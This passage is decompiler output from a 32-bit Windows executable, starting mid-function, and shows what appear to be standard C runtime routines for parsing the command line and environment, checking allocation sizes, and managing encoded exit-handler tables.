            v15 = 34;
            v16 = v5 == 0;
            v18 = v13 + 1;
            v17 = v12;
        }
        // 0x40a2e3
        v7 = v17;
        v6 = v18;
        if (v16 == 0) {
            char v28 = v15;
            if (v28 != 32 != v28 != 9) {
                // 0x40a2ef
                v11 = v6;
                v9 = 0;
                if (v7 == 0) {
                    goto lab_0x40a2fa;
                } else {
                    // 0x40a2f3
                    *(char *)(v7 - 1) = 0;
                    v11 = v6;
                    v9 = v7;
                    goto lab_0x40a2fa;
                }
            }
        }
        // 0x40a29c
        v4 = v19;
        v5 = v16;
    }
    // 0x40a2f9
    v11 = v10 - 1;
    v9 = v8;
    goto lab_0x40a2fa;
  lab_0x40a375:;
    // 0x40a375
    int32_t v64; // 0x40a26a
    int32_t v73 = v64;
    int32_t v63; // 0x40a26a
    int32_t v75 = v63;
    char v61; // 0x40a26a
    char v74 = v61;
    int32_t v48; // 0x40a26a
    int32_t v76 = v48; // 0x40a377
    int32_t v62; // 0x40a26a
    int32_t v77 = v62; // 0x40a377
    int32_t v78 = v48; // 0x40a377
    if (v62 != 0) {
        int32_t v79 = v76;
        int32_t v80 = 0; // 0x40a36d
        if (v79 != 0) {
            // 0x40a36f
            *(char *)v79 = 92;
            v80 = v79 + 1;
        }
        int32_t v81 = v77 - 1; // 0x40a36a
        *a5 = *a5 + 1;
        v77 = v81;
        v78 = v80;
        while (v81 != 0) {
            // 0x40a36a
            v79 = v80;
            v80 = 0;
            if (v79 != 0) {
                // 0x40a36f
                *(char *)v79 = 92;
                v80 = v79 + 1;
            }
            // 0x40a373
            v81 = v77 - 1;
            *a5 = *a5 + 1;
            v77 = v81;
            v78 = v80;
        }
    }
    int32_t v70 = v78;
    char * v72 = (char *)v73;
    char v82 = *v72; // 0x40a379
    if (v82 == 0) {
        // break -> 0x40a3ba
        goto lab_0x40a3ba_2;
    }
    if (v74 != 0) {
        goto lab_0x40a38d;
    } else {
        switch (v82) {
            case 32: {
                goto lab_0x40a3ba_2;
            }
            case 9: {
                goto lab_0x40a3ba_2;
            }
            default: {
                goto lab_0x40a38d;
            }
        }
    }
  lab_0x40a38d:;
    int32_t v83 = v73; // 0x40a38f
    int32_t v84 = v70; // 0x40a38f
    if (v75 != 0) {
        char v85 = v82; // 0x40a393
        int32_t v86 = 0; // 0x40a393
        if (v70 != 0) {
            // 0x40a395
            *(char *)v70 = v82;
            v85 = *v72;
            v86 = v70 + 1;
        }
        int32_t v87 = v86;
        *v3 = (int32_t)v85;
        int32_t v88 = function_40d791((int32_t)&g266); // 0x40a39c
        int32_t v89 = v73; // 0x40a3a4
        int32_t v90 = v87; // 0x40a3a4
        if (v88 != 0) {
            int32_t v91 = v73 + 1; // 0x40a3a6
            *a5 = *a5 + 1;
            v89 = v91;
            v90 = 0;
            if (v87 != 0) {
                // 0x40a3ad
                *(char *)v87 = *(char *)v91;
                v89 = v91;
                v90 = v87 + 1;
            }
        }
        // 0x40a3b2
        *a5 = *a5 + 1;
        v83 = v89;
        v84 = v90;
    }
    char v45 = v74; // 0x40a3b5
    int32_t v46 = v83 + 1; // 0x40a3b5
    int32_t v47 = v84; // 0x40a3b5
    goto lab_0x40a331;
  lab_0x40a366:;
    // 0x40a366
    char v65; // 0x40a26a
    v61 = v65;
    int32_t v59; // 0x40a26a
    v62 = v59 / 2;
    int32_t v66; // 0x40a26a
    v63 = v66;
    int32_t v67; // 0x40a26a
    v64 = v67;
    goto lab_0x40a375;
  lab_0x40a35e:;
    // 0x40a35e
    char v49; // 0x40a26a
    v65 = v49 == 0;
    v66 = 0;
    int32_t v60; // 0x40a26a
    v67 = v60;
    goto lab_0x40a366;
  lab_0x40a2fa:;
    char v29 = *(char *)v11; // 0x40a2fe
    char v30 = v29; // 0x40a301
    int32_t v31 = v9; // 0x40a301
    int32_t v32 = v11; // 0x40a301
    char v33 = 0; // 0x40a301
    int32_t v34 = v1; // 0x40a301
    int32_t v35 = v1; // 0x40a301
    if (v29 != 0) {
        while (true) {
            int32_t v36 = v34;
            int32_t v37 = v31;
            char v38 = v30; // 0x40a307
            int32_t v39 = v32; // 0x40a30b
            int32_t v40 = v32; // 0x40a30b
            if (v38 != 32 != v38 != 9) {
                int32_t v41 = v39 + 1; // 0x40a311
                char v42 = *(char *)v41; // 0x40a307
                v39 = v41;
                while (v42 != 32 != v42 != 9) {
                    // 0x40a311
                    v41 = v39 + 1;
                    v42 = *(char *)v41;
                    v39 = v41;
                }
                // 0x40a314
                v40 = v41;
                v35 = v36;
                if (v42 == 0) {
                    // break -> 0x40a3c9
                    break;
                }
            }
            int32_t v43 = 0; // 0x40a322
            if (v36 != 0) {
                // 0x40a324
                *(int32_t *)v36 = v37;
                v43 = v36 + 4;
            }
            int32_t v44 = v43;
            *a4 = *a4 + 1;
            v45 = v33;
            v46 = v40;
            v47 = v37;
            while (true) {
              lab_0x40a331:
                // 0x40a331
                v48 = v47;
                v49 = v45;
                char v50 = *(char *)v46; // 0x40a33a
                int32_t v51 = v46; // 0x40a33d
                int32_t v52 = v46; // 0x40a33d
                int32_t v53 = 0; // 0x40a33d
                char v54 = v50; // 0x40a33d
                if (v50 == 92) {
                    int32_t v55 = v51 + 1; // 0x40a338
                    int32_t v56 = 1; // 0x40a339
                    char v57 = *(char *)v55; // 0x40a33a
                    int32_t v58 = v56; // 0x40a33d
                    v51 = v55;
                    v52 = v55;
                    v53 = v56;
                    v54 = v57;
                    while (v57 == 92) {
                        // 0x40a338
                        v55 = v51 + 1;
                        v56 = v58 + 1;
                        v57 = *(char *)v55;
                        v58 = v56;
                        v51 = v55;
                        v52 = v55;
                        v53 = v56;
                        v54 = v57;
                    }
                }
                // 0x40a33f
                v59 = v53;
                v60 = v52;
                v61 = v49;
                v62 = v59;
                v63 = 1;
                v64 = v60;
                if (v54 != 34) {
                    goto lab_0x40a375;
                } else {
                    // 0x40a344
                    v65 = v49;
                    v66 = 1;
                    v67 = v60;
                    if ((v59 & 1) != 0) {
                        goto lab_0x40a366;
                    } else {
                        if (v49 == 0) {
                            goto lab_0x40a35e;
                        } else {
                            int32_t v68 = v60 + 1; // 0x40a34f
                            v65 = v49;
                            v66 = 1;
                            v67 = v68;
                            if (*(char *)v68 != 34) {
                                goto lab_0x40a35e;
                            } else {
                                goto lab_0x40a366;
                            }
                        }
                    }
                }
            }
          lab_0x40a3ba_2:;
            int32_t v69 = 0; // 0x40a3bc
            if (v70 != 0) {
                // 0x40a3be
                *(char *)v70 = 0;
                v69 = v70 + 1;
            }
            // 0x40a3c2
            *a5 = *a5 + 1;
            char v71 = *v72; // 0x40a2fe
            v30 = v71;
            v31 = v69;
            v32 = v73;
            v33 = v74;
            v34 = v44;
            v35 = v44;
            if (v71 == 0) {
                // break -> 0x40a3c9
                break;
            }
        }
    }
    // 0x40a3c9
    if (v35 != 0) {
        // 0x40a3d3
        *(int32_t *)v35 = 0;
    }
    // 0x40a3d6
    *a4 = *a4 + 1;
    return (int32_t)a4;
}

// Address range: 0x40a3df - 0x40a434
int32_t function_40a3df(uint32_t a1, uint32_t a2, uint32_t a3) {
    // 0x40a3df
    if (a1 >= 0x3fffffff || 0xffffffff / a3 <= a2) {
        // 0x40a431
        return 0;
    }
    uint32_t v1 = a3 * a2; // 0x40a406
    int32_t v2 = 4 * a1; // 0x40a40a
    int32_t result = 0; // 0x40a411
    if (v1 < (v2 ^ -1)) {
        // 0x40a417
        result = function_40ca21(v1 + v2, 1);
        function_40c15c(0);
    }
    // 0x40a431
    return result;
}

// Address range: 0x40a434 - 0x40a43f
int32_t function_40a434(int32_t a1) {
    // 0x40a434
    return function_40a146((int32_t)&g266);
}

// Address range: 0x40a43f - 0x40a498
int32_t function_40a43f(void) {
    // 0x40a43f
    if (g191 != 0) {
        // 0x40a448
        return 0;
    }
    // 0x40a44b
    int32_t v1; // bp-8, 0x40a43f
    int32_t v2 = &v1; // 0x40a44c
    function_40d406();
    int32_t v3 = function_40d7f9(); // 0x40a452
    if (v3 == 0) {
        // 0x40a48c
        *(int32_t *)(v2 - 4) = v3;
        function_40c15c((int32_t)&g266);
        return -1;
    }
    int32_t v4 = v3; // bp-12, 0x40a462
    int32_t v5 = function_40a498(v3); // 0x40a463
    int32_t v6 = v2; // 0x40a46b
    int32_t result = -1; // 0x40a46b
    if (v5 != 0) {
        // 0x40a472
        v4 = v5;
        g193 = v5;
        function_4099f8(v5);
        v6 = &v4;
        result = 0;
    }
    int32_t * v7 = (int32_t *)(v6 - 4);
    *v7 = 0;
    function_40c15c((int32_t)&g266);
    // 0x40a48c
    *v7 = v3;
    function_40c15c((int32_t)&g266);
    return result;
}

// Address range: 0x40a498 - 0x40a569
int32_t function_40a498(int32_t a1) {
    char * v1 = (char *)a1;
    char v2 = *v1; // 0x40a4a9
    int32_t v3 = a1; // 0x40a4c7
    int32_t v4 = 0; // 0x40a4c7
    int32_t v5 = 1; // 0x40a4c7
    if (v2 != 0) {
        while (*(char *)v3 != 0) {
            // 0x40a4b7
            v3++;
        }
        // 0x40a4be
        v4 += (int32_t)(v2 != 61);
        char v6 = *(char *)v3; // 0x40a4c3
        while (v6 != 0) {
            // 0x40a4ad
            while (*(char *)v3 != 0) {
                // 0x40a4b7
                v3++;
            }
            // 0x40a4be
            v4 += (int32_t)(v6 != 61);
            v6 = *(char *)v3;
        }
        // 0x40a4c5
        v5 = v4 + 1;
    }
    int32_t result = function_40ca21(v5, 4); // 0x40a4cf
    int32_t v7; // bp-24, 0x40a498
    int32_t v8 = &v7; // 0x40a4d7
    if (result == 0) {
        // 0x40a54b
        *(int32_t *)(v8 - 4) = 0;
        function_40c15c((int32_t)&g266);
        return 0;
    }
    char v9 = *v1; // 0x40a533
    if (v9 == 0) {
        // 0x40a54b
        *(int32_t *)(v8 - 4) = 0;
        function_40c15c((int32_t)&g266);
        return result;
    }
    int32_t * v10 = (int32_t *)(v8 - 4);
    int32_t * v11 = (int32_t *)(v8 - 8);
    int32_t * v12 = (int32_t *)(v8 - 12);
    int32_t v13 = a1;
    int32_t v14 = v13 + 1; // 0x40a4e8
    while (*(char *)v13 != 0) {
        // 0x40a4e6
        v13 = v14;
        v14 = v13 + 1;
    }
    int32_t v15 = result; // 0x40a4f8
    int32_t result2; // 0x40a498
    int32_t v16; // 0x40a4f2
    int32_t v17; // 0x40a4fd
    int32_t v18; // 0x40a50f
    if (v9 != 61) {
        // 0x40a4fa
        v16 = v13 - a1 + 1;
        *v10 = 1;
        *v11 = v16;
        v17 = function_40ca21(v16, (int32_t)&g266);
        if (v17 == 0) {
            // 0x40a53a
            *v10 = result;
            function_40a569((int32_t)&g266);
            *v11 = 0;
            function_40c15c((int32_t)&g266);
            result2 = 0;
            goto lab_0x40a54b;
        }
        // 0x40a50a
        *v10 = a1;
        *v11 = v16;
        *v12 = v17;
        v18 = function_40aeb1((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *v10 = 0;
        if (v18 != 0) {
            // 0x40a55c
            *v11 = 0;
            *v12 = 0;
            *(int32_t *)(v8 - 16) = 0;
            *(int32_t *)(v8 - 20) = 0;
            function_409c20();
            return __asm_int3();
        }
        // 0x40a51b
        *(int32_t *)result = v17;
        v15 = result + 4;
        function_40c15c(v15);
    }
    char v19 = *(char *)v14; // 0x40a533
    result2 = result;
    while (v19 != 0) {
        int32_t v20 = v15;
        int32_t v21 = v14;
        v13 = v21;
        v14 = v13 + 1;
        while (*(char *)v13 != 0) {
            // 0x40a4e6
            v13 = v14;
            v14 = v13 + 1;
        }
        // 0x40a4ed
        v15 = v20;
        if (v19 != 61) {
            // 0x40a4fa
            v16 = v13 - v21 + 1;
            *v10 = 1;
            *v11 = v16;
            v17 = function_40ca21(v16, (int32_t)&g266);
            if (v17 == 0) {
                // 0x40a53a
                *v10 = result;
                function_40a569((int32_t)&g266);
                *v11 = 0;
                function_40c15c((int32_t)&g266);
                result2 = 0;
                goto lab_0x40a54b;
            }
            // 0x40a50a
            *v10 = v21;
            *v11 = v16;
            *v12 = v17;
            v18 = function_40aeb1((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            *v10 = 0;
            if (v18 != 0) {
                // 0x40a55c
                *v11 = 0;
                *v12 = 0;
                *(int32_t *)(v8 - 16) = 0;
                *(int32_t *)(v8 - 20) = 0;
                function_409c20();
                return __asm_int3();
            }
            // 0x40a51b
            *(int32_t *)v20 = v17;
            v15 = v20 + 4;
            function_40c15c(v15);
        }
        // 0x40a531
        v19 = *(char *)v14;
        result2 = result;
    }
  lab_0x40a54b:
    // 0x40a54b
    *(int32_t *)(v8 - 4) = 0;
    function_40c15c((int32_t)&g266);
    return result2;
}

// Address range: 0x40a569 - 0x40a598
int32_t function_40a569(int32_t a1) {
    if (a1 == 0) {
        // 0x40a595
        int32_t result; // 0x40a569
        return result;
    }
    int32_t v1 = *(int32_t *)a1; // 0x40a576
    int32_t v2; // bp-12, 0x40a569
    int32_t * v3 = (int32_t *)((int32_t)&v2 - 4);
    int32_t v4 = a1; // 0x40a58b
    if (v1 == 0) {
        // 0x40a58d
        *v3 = a1;
        // 0x40a595
        return function_40c15c((int32_t)&g266);
    }
    *v3 = v1;
    function_40c15c((int32_t)&g266);
    v4 += 4;
    int32_t v5 = *(int32_t *)v4; // 0x40a586
    while (v5 != 0) {
        // 0x40a57d
        *v3 = v5;
        function_40c15c((int32_t)&g266);
        v4 += 4;
        v5 = *(int32_t *)v4;
    }
    // 0x40a58d
    *v3 = a1;
    // 0x40a595
    return function_40c15c((int32_t)&g266);
}

// Address range: 0x40a598 - 0x40a599
int32_t function_40a598(int32_t a1) {
    // 0x40a598
    int32_t result; // 0x40a598
    return result;
}

// Address range: 0x40a59a - 0x40a5d8
int32_t function_40a59a(int32_t a1) {
    int32_t v1; // 0x40a59a
    int32_t v2 = v1;
    int32_t v3; // bp-16, 0x40a59a
    *(int32_t *)((int32_t)&v3 - 4) = v2;
    function_406b3d();
    v1 = v2 + 4;
    // 0x40a59a
    int32_t v4; // 0x40a59a
    while (v2 != v4) {
        // 0x40a5b1
        v2 = v1;
        *(int32_t *)((int32_t)&v3 - 4) = v2;
        function_406b3d();
        v1 = v2 + 4;
    }
    // 0x40a5c6
    return function_406b2c();
}

// Address range: 0x40a5da - 0x40a5f3
int32_t function_40a5da(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x40a5e0
    int32_t result = v1; // 0x40a5e8
    if (v1 != g193) {
        // 0x40a5ea
        result = function_40a569(v1);
    }
    // 0x40a5f1
    return result;
}

// Address range: 0x40a5f5 - 0x40a60e
int32_t function_40a5f5(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x40a5fb
    int32_t result = v1; // 0x40a603
    if (v1 != g192) {
        // 0x40a605
        result = function_40a569(v1);
    }
    // 0x40a60c
    return result;
}

// Address range: 0x40a60e - 0x40a645
int32_t function_40a60e(void) {
    // 0x40a60e
    function_40a598(0x40a5d8);
    function_40a598(0x40a5f3);
    function_40a569(g193);
    return function_40a569(g192);
}

// Address range: 0x40a645 - 0x40a64a
int32_t function_40a645(void) {
    // 0x40a645
    return function_40a43f();
}

// Address range: 0x40a64a - 0x40a68c
int32_t function_40a64a(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40a64a
    function_406cf0(&g89, 12, (int32_t)&g266);
    int32_t v1; // 0x40a64a
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40a656
    *v2 = 0;
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40a665
    *v3 = 0;
    *v2 = function_40a85c();
    *v3 = -2;
    function_40a68f();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40a684
    return result;
}

// Address range: 0x40a68f - 0x40a69b
int32_t function_40a68f(void) {
    // 0x40a68f
    int32_t v1; // 0x40a68f
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40a69b - 0x40a6dd
int32_t function_40a69b(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40a69b
    function_406cf0(&g90, 12, (int32_t)&g266);
    int32_t v1; // 0x40a69b
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40a6a7
    *v2 = 0;
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40a6b6
    *v3 = 0;
    *v2 = function_40a73c();
    *v3 = -2;
    function_40a6e0();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40a6d5
    return result;
}

// Address range: 0x40a6e0 - 0x40a6ec
int32_t function_40a6e0(void) {
    // 0x40a6e0
    int32_t v1; // 0x40a6e0
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40a6ec - 0x40a714
int32_t function_40a6ec(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4) {
    int32_t v1 = a1; // bp-12, 0x40a6fa
    int32_t v2 = a1; // bp-16, 0x40a6fd
    int32_t v3; // 0x40a6ec
    return function_40a69b(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40a714 - 0x40a73c
int32_t function_40a714(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40a722
    int32_t v2 = a1; // bp-16, 0x40a725
    int32_t v3; // 0x40a714
    return function_40a64a(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40a73c - 0x40a85c
int32_t function_40a73c(void) {
    // 0x40a73c
    int32_t v1; // 0x40a73c
    if (v1 == 0) {
        // 0x40a84d
        return function_406b2c();
    }
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40a770
    uint32_t v3 = g112 & 31; // 0x40a773
    int32_t v4 = g112 ^ v1; // 0x40a776
    int32_t v5 = *v2 ^ g112; // 0x40a77d
    int32_t v6 = v4; // 0x40a77f
    int32_t v7 = v5; // 0x40a77f
    if (v3 != 0) {
        uint32_t v8 = 32 - v3;
        v6 = v4 << v8 | v4 >> v3;
        v7 = v5 >> v3 | v5 << v8;
    }
    // .thread
    if (v6 < 1) {
        // 0x40a84d
        return function_406b2c();
    }
    // 0x40a79a
    int32_t v9; // bp-40, 0x40a73c
    int32_t * v10 = (int32_t *)((int32_t)&v9 - 4);
    int32_t v11 = v3; // 0x40a7d0
    int32_t v12 = v6;
    int32_t v13 = v7;
    uint32_t v14; // 0x40a73c
    while (true) {
        int32_t v15 = v13;
        v14 = v12;
        *v10 = 32;
        uint32_t v16 = v11;
        int32_t v17 = v15 - 4; // 0x40a7a5
        if (v17 < v14) {
            // break (via goto) -> 0x40a80c
            goto lab_0x40a80c;
        }
        int32_t * v18 = (int32_t *)v17;
        int32_t v19 = *v18; // 0x40a7ac
        int32_t v20 = v17; // 0x40a7ae
        while (v19 == g112) {
            // 0x40a7a5
            v17 = v20 - 4;
            if (v17 < v14) {
                // break (via goto) -> 0x40a80c
                goto lab_0x40a80c;
            }
            // 0x40a7ac
            v18 = (int32_t *)v17;
            v19 = *v18;
            v20 = v17;
        }
        int32_t v21 = v19 ^ g112; // 0x40a7b5
        int32_t v22 = v21; // 0x40a7b7
        if (v16 != 0) {
            v22 = v21 >> v16 | v21 << 32 - v16;
        }
        *v18 = g112;
        function_406b3d();
        int32_t v23 = g112; // 0x40a7c8
        v11 = v23 & 31;
        int32_t v24 = v23 ^ v22; // 0x40a7df
        int32_t v25 = *(int32_t *)(v22 + 4) ^ v23; // 0x40a7e4
        int32_t v26 = v24; // 0x40a7e8
        int32_t v27 = v25; // 0x40a7e8
        uint32_t v28; // 0x40a73c
        if (v11 != 0) {
            v28 = 32 - v11;
            v26 = v24 << v28 | v24 >> v11;
            v27 = v25 >> v11 | v25 << v28;
        }
        // .thread3
        v13 = v27;
        v12 = v26;
        while (v12 == v14) {
            // 0x40a7f5
            *v10 = 32;
            int32_t v29 = v17; // 0x40a7fb
            if (v13 != v15) {
                // break -> 0x40a800
                break;
            }
            v16 = v11;
            v17 = v29 - 4;
            if (v17 < v14) {
                // break (via goto) -> 0x40a80c
                goto lab_0x40a80c;
            }
            // 0x40a7ac
            v18 = (int32_t *)v17;
            v19 = *v18;
            v20 = v17;
            while (v19 == v23) {
                // 0x40a7a5
                v17 = v20 - 4;
                if (v17 < v14) {
                    // break (via goto) -> 0x40a80c
                    goto lab_0x40a80c;
                }
                // 0x40a7ac
                v18 = (int32_t *)v17;
                v19 = *v18;
                v20 = v17;
            }
            // 0x40a7b0
            v21 = v19 ^ v23;
            v22 = v21;
            if (v16 != 0) {
                v22 = v21 >> v16 | v21 << 32 - v16;
            }
            *v18 = v23;
            function_406b3d();
            v23 = g112;
            v11 = v23 & 31;
            v24 = v23 ^ v22;
            v25 = *(int32_t *)(v22 + 4) ^ v23;
            v26 = v24;
            v27 = v25;
            if (v11 != 0) {
                v28 = 32 - v11;
                v26 = v24 << v28 | v24 >> v11;
                v27 = v25 >> v11 | v25 << v28;
            }
            // .thread3
            v13 = v27;
            v12 = v26;
        }
    }
  lab_0x40a80c:
    if (v14 != -1) {
        // 0x40a811
        *v10 = v14;
        function_40c15c((int32_t)&g266);
    }
    // 0x40a81e
    *v10 = 32;
    *(int32_t *)v1 = g112;
    *v2 = g112;
    *(int32_t *)(v1 + 8) = g112;
    // 0x40a84d
    return function_406b2c();
}

// Address range: 0x40a85c - 0x40a99d
int32_t function_40a85c(void) {
    // 0x40a85c
    int32_t v1; // 0x40a85c
    if (v1 == 0) {
        // 0x40a998
        return -1;
    }
    uint32_t v2 = g112 & 31; // 0x40a884
    int32_t * v3 = (int32_t *)(v1 + 4); // 0x40a888
    int32_t v4 = *v3 ^ g112; // 0x40a890
    int32_t v5 = *(int32_t *)(v1 + 8) ^ g112; // 0x40a892
    int32_t v6 = v4; // 0x40a894
    int32_t v7 = v5; // 0x40a894
    if (v2 != 0) {
        uint32_t v8 = 32 - v2;
        v6 = v4 >> v2 | v4 << v8;
        v7 = v5 >> v2 | v5 << v8;
    }
    int32_t v9 = v2; // 0x40a89c
    int32_t v10 = 0; // 0x40a89c
    int32_t v11 = v7; // 0x40a89c
    int32_t v12 = v6; // 0x40a89c
    int32_t v13; // 0x40a85c
    int32_t v14; // 0x40a85c
    uint32_t v15; // 0x40a8a9
    if (v6 != v7) {
        goto lab_0x40a956;
    } else {
        // 0x40a8a2
        v15 = v7 / 4;
        int32_t v16 = (v15 < 512 ? v15 : 512) + v15; // 0x40a8b2
        int32_t v17 = v16 != 0 ? v16 : 32;
        if (v17 < v15) {
            goto lab_0x40a8dd;
        } else {
            int32_t v18 = function_40d87c(0, v17, 4); // 0x40a8c4
            function_40c15c(0);
            v13 = v18;
            v14 = v17;
            if (v18 != 0) {
                goto lab_0x40a905;
            } else {
                goto lab_0x40a8dd;
            }
        }
    }
  lab_0x40a956:
    // 0x40a956
    *(int32_t *)v12 = function_409e7b(*(int32_t *)*v3);
    *(int32_t *)v9 = function_406100(v10);
    *(int32_t *)(v9 + 4) = function_406100(v12 + 4);
    *(int32_t *)(v9 + 8) = function_406100(v11);
    // 0x40a998
    return 0;
  lab_0x40a8dd:;
    int32_t v19 = v15 + 4; // 0x40a8df
    int32_t v20 = function_40d87c(0, v19, 4); // 0x40a8e4
    function_40c15c(0);
    v13 = v20;
    v14 = v19;
    if (v20 == 0) {
        // 0x40a998
        return -1;
    }
    goto lab_0x40a905;
  lab_0x40a905:;
    int32_t v21 = v13 + (v7 & -4); // 0x40a905
    int32_t v22 = 4 * v14 + v13; // 0x40a90d
    uint32_t v23 = 3 - v21 + v22; // 0x40a933
    v9 = v21;
    v10 = v13;
    v11 = v22;
    v12 = v21;
    if (v22 >= v21 && v23 >= 4) {
        int32_t v24 = 1; // 0x40a94b
        *(int32_t *)v21 = g112;
        int32_t v25 = v21 + 4; // 0x40a94e
        int32_t v26 = v24; // 0x40a954
        int32_t v27 = v25; // 0x40a954
        v9 = v25;
        v10 = v13;
        v11 = v22;
        v12 = v21;
        while (v24 != v23 / 4) {
            // 0x40a94b
            v24 = v26 + 1;
            *(int32_t *)v27 = g112;
            v25 = v27 + 4;
            v26 = v24;
            v27 = v25;
            v9 = v25;
            v10 = v13;
            v11 = v22;
            v12 = v21;
        }
    }
    goto lab_0x40a956;
}

// Address range: 0x40a99d - 0x40a9b3
int32_t function_40a99d(int32_t a1, int32_t a2) {
    // 0x40a99d
    int32_t v1; // 0x40a99d
    return function_40aa0d(&g194, a1, v1);
}

// Address range: 0x40a9b3 - 0x40a9d0
int32_t function_40a9b3(void) {
    // 0x40a9b3
    int32_t v1; // 0x40a9b3
    int32_t v2 = &v1; // bp-8, 0x40a9bc
    int32_t v3; // 0x40a9b3
    return function_40a6ec(2, &v2, &v1, v3);
}

// Address range: 0x40a9d0 - 0x40aa0d
int32_t function_40a9d0(int32_t * a1) {
    // 0x40a9d0
    if (a1 == NULL) {
        // 0x40aa0a
        return -1;
    }
    int32_t v1 = (int32_t)a1;
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40a9e4
    if (*a1 == *v2) {
        // 0x40a9e9
        *a1 = g112;
        *(int32_t *)(v1 + 4) = g112;
        *v2 = g112;
    }
    // 0x40aa0a
    return 0;
}

// Address range: 0x40aa0d - 0x40aa31
int32_t function_40aa0d(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x40aa0d
    int32_t v1; // 0x40aa0d
    int32_t v2 = &v1; // bp-12, 0x40aa17
    int32_t v3; // 0x40aa0d
    int32_t v4; // 0x40aa0d
    return function_40a714(2, &v2, &v1, &v3, v4);
}

// Address range: 0x40aa31 - 0x40aa43
int32_t function_40aa31(void) {
    // 0x40aa31
    return function_4099f8((int32_t)&g122) & -256 | 1;
}

// Address range: 0x40aa43 - 0x40aa5d
int32_t function_40aa43(void) {
    // 0x40aa43
    function_40a9d0(&g194);
    return function_40a9d0(&g195) & -256 | 1;
}

// Address range: 0x40aa5d - 0x40aa65
int32_t function_40aa5d(void) {
    // 0x40aa5d
    return function_40a60e() & -256 | 1;
}

// Address range: 0x40aa65 - 0x40aaa2
int32_t function_40aa65(void) {
    // 0x40aa65
    int32_t v1; // 0x40aa65
    function_409b64(g112, v1);
    function_409c5e(g112);
    function_40dae2(g112);
    function_40ab74(g112);
    return function_40a0b5(g112) & -256 | 1;
}

// Address range: 0x40aaa2 - 0x40aaab
int32_t function_40aaa2(void) {
    // 0x40aaa2
    return function_407476(0);
}

// Address range: 0x40aaab - 0x40ab22
int32_t function_40aaab(void) {
    int32_t v1 = (int32_t)g133 - 1; // 0x40aab4
    *g133 = v1;
    if (v1 == 0) {
        // 0x40aaba
        if (g133 != &g131) {
            // 0x40aac8
            function_40c15c((int32_t)g133);
            *(int32_t *)&g133 = (int32_t)&g131;
        }
    }
    // 0x40aad5
    function_40c15c(g204);
    g204 = 0;
    function_40c15c(g205);
    g205 = 0;
    function_40c15c(g222);
    g222 = 0;
    int32_t v2 = function_40c15c(g223); // 0x40ab10
    g223 = 0;
    return v2 & -256 | 1;
}

// Address range: 0x40ab22 - 0x40ab34
int32_t function_40ab22(void) {
    // 0x40ab22
    return function_40d90f(&g32, &g33);
}

// Address range: 0x40ab34 - 0x40ab46
int32_t function_40ab34(int32_t a1, int32_t a2) {
    // 0x40ab34
    return function_40d992(&g32, &g33);
}

// Address range: 0x40ab46 - 0x40ab4c
int32_t function_40ab46(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40ab46
    return g196;
}

// Address range: 0x40ab4c - 0x40ab5b
int32_t function_40ab4c(int32_t result, int32_t a2) {
    // 0x40ab4c
    g196 = result;
    return result;
}

// Address range: 0x40ab5b - 0x40ab74
int32_t function_40ab5b(void) {
    int32_t v1 = g197 ^ g112; // 0x40ab62
    uint32_t v2 = g112 & 31; // 0x40ab68
    int32_t v3 = v1; // 0x40ab6b
    if (v2 != 0) {
        v3 = v1 >> v2 | v1 << 32 - v2;
    }
    return v3 != 0;
}

// Address range: 0x40ab74 - 0x40ab88
int32_t function_40ab74(int32_t a1) {
    // 0x40ab74
    return function_4099f8(a1);
}

// Address range: 0x40ab88 - 0x40ab89
int32_t function_40ab88(void) {
    // 0x40ab88
    int32_t result; // 0x40ab88
    return result;
}

// Address range: 0x40ab8a - 0x40abd1
int32_t function_40ab8a(int32_t a1) {
    int32_t v1 = g197 ^ g112; // 0x40aba1
    uint32_t v2 = g112 & 31; // 0x40aba7
    int32_t v3 = v1; // 0x40abaa
    if (v2 != 0) {
        v3 = v1 >> v2 | v1 << 32 - v2;
    }
    if (v3 != 0) {
        // 0x40abb4
        function_406b3d();
    }
    // 0x40abc2
    return function_406b2c();
}

// Address range: 0x40abd1 - 0x40abe6
int32_t function_40abd1(int32_t a1) {
    int32_t result = function_409e7b(a1); // 0x40abd9
    g197 = result;
    return result;
}

// Address range: 0x40abe6 - 0x40ac39
int32_t function_40abe6(void) {
    // 0x40abe6
    function_40d406();
    char * v1 = g224; // 0x40abef
    int32_t v2 = 0; // 0x40abfe
    int32_t v3 = v1 != NULL ? (int32_t)v1 : (int32_t)&g198; // 0x40abfe
    int32_t v4; // 0x40abe6
    int32_t result; // 0x40abe6
    while (true) {
        int32_t v5 = v3;
        int32_t v6 = v2;
        char v7 = *(char *)v5; // 0x40ac00
        if (v7 > 32) {
            // 0x40ac0e
            v2 = v6;
            if (v7 == 34) {
                // 0x40ac12
                v2 = (char)v6 == 0;
            }
        } else {
            // 0x40ac06
            result = v5;
            if (v7 == 0) {
                // break -> 0x40ac34
                break;
            }
            // 0x40ac0a
            v2 = v6;
            v4 = v5;
